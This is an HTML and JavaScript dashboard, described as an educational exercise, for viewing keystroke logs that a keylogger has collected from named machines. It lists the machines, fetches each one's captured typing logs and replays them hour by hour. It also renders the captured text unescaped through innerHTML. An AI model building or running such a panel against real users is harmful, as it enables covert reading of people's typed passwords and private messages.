<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Keylogger</title>
  <style>
    /* Cyberpunk font */
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    body {
      margin: 0;
      height: 100vh;
      background: radial-gradient(circle at center, #0f0f0f 0%, #000 100%);
      color: #00ffea;
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    h1 {
      font-size: 3rem;
      text-shadow: 0 0 10px #00ffea, 0 0 20px #00ffea, 0 0 40px #00ffea;
      animation: glitch 2s infinite;
    }

    h2 {
      font-size: 2rem;
      color: #ff4444;
      margin-top: 10px;
      text-align: center;
      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
      animation: flicker 1.5s infinite;
      max-width: 700px;
    }

    p {
      font-size: 1.1rem;
      text-align: center;
      max-width: 700px;
      margin-top: 15px;
      text-shadow: 0 0 8px #ff00ff;
    }

    button {
      margin-top: 20px;
      padding: 12px 24px;
      background: transparent;
      border: 2px solid #00ffea;
      color: #00ffea;
      font-size: 1rem;
      cursor: pointer;
      border-radius: 6px;
      transition: 0.3s;
      text-shadow: 0 0 5px #00ffea;
      animation: pulse 2s infinite;
    }

    button:hover {
      background: #00ffea;
      color: #000;
      box-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea;
    }

    /* Terminal box */
    .terminal {
      margin-top: 30px;
      width: 80%;
      max-width: 700px;
      height: 300px;
      background: rgba(0, 0, 0, 0.8);
      border: 2px solid #00ffea;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,255,234,0.5);
      padding: 15px;
      color: #00ffea;
      font-size: 1rem;
      text-align: left;
      overflow: auto;
      display: none;
      white-space: pre-wrap;
      position: relative;
    }

    /* Blinking cursor */
    .cursor {
      display: inline-block;
      width: 10px;
      height: 1.2em;
      background: #00ffea;
      margin-left: 5px;
      animation: blink 0.7s steps(1) infinite;
    }

    /* Animations */
    @keyframes blink {
      50% { opacity: 0; }
    }

    @keyframes glitch {
      0% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffea; }
      20% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffea; }
      40% { text-shadow: 2px -2px #ff00ff, -2px 2px #00ffea; }
      60% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffea; }
      80% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffea; }
      100% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffea; }
    }

    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 10px #00ffea; }
      50% { box-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea; }
    }

    @keyframes flicker {
      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
      20%, 22%, 24%, 55% { opacity: 0.3; }
    }

    /* Moving grid background */
    .grid {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background-image: linear-gradient(0deg, transparent 24%, rgba(0,255,234,0.15) 25%, rgba(0,255,234,0.15) 26%, transparent 27%, transparent 74%, rgba(0,255,234,0.15) 75%, rgba(0,255,234,0.15) 76%, transparent 77%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,234,0.15) 25%, rgba(0,255,234,0.15) 26%, transparent 27%, transparent 74%, rgba(0,255,234,0.15) 75%, rgba(0,255,234,0.15) 76%, transparent 77%, transparent);
      background-size: 50px 50px;
      z-index: -1;
      animation: moveGrid 12s linear infinite;
    }

    @keyframes moveGrid {
      from { background-position: 0 0; }
      to { background-position: 50px 50px; }
    }
  </style>
</head>
<body>
  <div class="grid"></div>
  <h1>TOP SECRET</h1>
  <h2>⚠ WARNING ⚠</h2>
  <p>
    The content of this exercise is intended for educational purposes only.
    The tool may not be used for illegal or unethical purposes. Work is performed in a personal or virtual environment only,
    and after approval by the computer owners. All participants are required to adhere to professional ethics rules and legal restrictions.
  </p>


  <div class="controls" style="margin-top:10px;">
  <label>pick a pc:</label>
  <select id="machineSelect" style="margin-left:8px; padding:6px; border:1px solid #00ffea; background:black; color:#00ffea; border-radius:6px"></select>

  <label style="margin-left:16px;">pick a date/hour:</label>
  <select id="timeSelect" style="margin-left:8px; padding:6px; border:1px solid #00ffea; background:black; color:#00ffea; border-radius:6px">
    <option value="__all__">הכול</option>
  </select>
</div>

  <button id="hackBtn">LOAD DATA</button>

  <div class="terminal" id="terminal">
    <span id="typedText"></span><span class="cursor"></span>
  </div>
<script>
  const btn = document.getElementById('hackBtn');
  const terminal = document.getElementById('terminal');
  const typedText = document.getElementById('typedText');
  const machineSelect = document.getElementById('machineSelect');
  const timeSelect = document.getElementById('timeSelect');

  let text = "";
  let currentLogs = []; // כאן נשמור את כל הרשומות של המחשב הנבחר

  // ---------- עזר: פרסינג של חותמת הזמן 'dd/mm/yyyy HH:MM:SS' ----------
  function tsToHourKey(ts) {
    // מחזיר מפתח שעה בפורמט ISO קצר: 'YYYY-MM-DDTHH'
    const m = ts.match(/^(\d{2})\/(\d{2})\/(\d{4}) (\d{2}):(\d{2}):(\d{2})$/);
    if (!m) return null;
    const [ , dd, mm, yyyy, HH ] = m;
    return `${yyyy}-${mm}-${dd}T${HH}`;
  }
  function hourKeyToDisplay(hk) {
    // הופך 'YYYY-MM-DDTHH' לתווית תצוגה 'dd/mm/yyyy HH:00'
    if (!hk || hk.length < 13) return hk || '';
    const [date, HH] = hk.split('T');
    const [yyyy, mm, dd] = date.split('-');
    return `${dd}/${mm}/${yyyy} ${HH}:00`;
  }

  // ---------- שלב 1: טען את רשימת המחשבים ----------
  async function loadMachines() {
    machineSelect.innerHTML = "";
    timeSelect.innerHTML = `<option value="__all__">הכול</option>`;
    btn.disabled = true;

    try {
      const res = await fetch('/machines');
      if (!res.ok) throw new Error('שגיאה בטעינת /machines: ' + res.status);
      const data = await res.json();

      const names = Array.isArray(data.machines) ? data.machines : [];
      if (names.length === 0) {
        machineSelect.innerHTML = `<option value="">— אין מכונות —</option>`;
        return;
      }

      // מלא את ה-select במחשבים (לפי השמות שמוחזרים מהשרת)
      names.sort((a,b) => a.localeCompare(b));
      for (const name of names) {
        const opt = document.createElement('option');
        opt.value = name;
        opt.textContent = name;
        machineSelect.appendChild(opt);
      }

      // בחר את הראשון והכן את רשימת השעות עבורו
      machineSelect.selectedIndex = 0;
      await onMachineChanged();

      btn.disabled = false;
    } catch (e) {
      console.error(e);
      machineSelect.innerHTML = `<option value="">שגיאה בטעינת מכונות</option>`;
    }
  }

  // ---------- שלב 2: כשבוחרים מחשב — טען את כל ה-logs שלו, ובנה רשימת שעות ----------
  async function onMachineChanged() {
    const machineName = machineSelect.value;
    if (!machineName) return;

    // טען את כל הרשומות של המחשב הנבחר
    const res = await fetch(`/Typing_data/${encodeURIComponent(machineName)}`);
    if (!res.ok) {
      currentLogs = [];
      timeSelect.innerHTML = `<option value="__all__">הכול</option>`;
      return;
    }
    const data = await res.json();
    currentLogs = Array.isArray(data.logs) ? data.logs : [];

    // הפק רשימת שעות ייחודיות מתוך החותמות
    const set = new Set();
    for (const item of currentLogs) {
      const k = Object.keys(item)[0];
      const hk = k && tsToHourKey(k);
      if (hk) set.add(hk);
    }
    const hours = Array.from(set);
    hours.sort((a,b) => b.localeCompare(a)); // מהחדש לישן

    // מלא את ה-select של השעות
    timeSelect.innerHTML = `<option value="__all__">הכול</option>`;
    for (const hk of hours) {
      const opt = document.createElement('option');
      opt.value = hk;
      opt.textContent = hourKeyToDisplay(hk);
      timeSelect.appendChild(opt);
    }
  }

  // ---------- שלב 3: בניית הטקסט לפי בחירת שעה ----------
  function buildTextForSelection() {
    const chosenHour = timeSelect.value; // '__all__' או 'YYYY-MM-DDTHH'
    const parts = [];

    for (const item of currentLogs) {
      const [k, v] = Object.entries(item)[0] || [];
      if (!k) continue;

      if (chosenHour !== '__all__') {
        const hk = tsToHourKey(k);
        if (hk !== chosenHour) continue; // סנן לפי שעה שנבחרה
      }
      parts.push(`[${k}] ${v}`);
    }

    return parts.join("\n") || "(אין נתונים להצגה לבחירה זו)";
  }

  // ---------- שלב 4: אנימציית "מכונת כתיבה" ----------
  let i = 0;
  function typeWriter() {
    if (i < text.length) {
      typedText.innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, 50);
    }
  }

  // ---------- שלב 5: אירועים ----------
  // בעת שינוי מחשב — טען logs ובנה שעות
  machineSelect.addEventListener('change', onMachineChanged);

  // בלחיצה: בנה טקסט לבחירות הנוכחיות והרץ Typewriter
  btn.addEventListener('click', async () => {
    terminal.style.display = "block";
    typedText.innerHTML = "";
    i = 0;

    // אם החלפת מחשב מאז הטעינה — onMachineChanged כבר עדכן currentLogs ו-timeSelect
    text = buildTextForSelection();
    typeWriter();
  });

  // בעת טעינת הדף — טען מחשבים
  document.addEventListener('DOMContentLoaded', loadMachines);
</script>


</body>
</html>
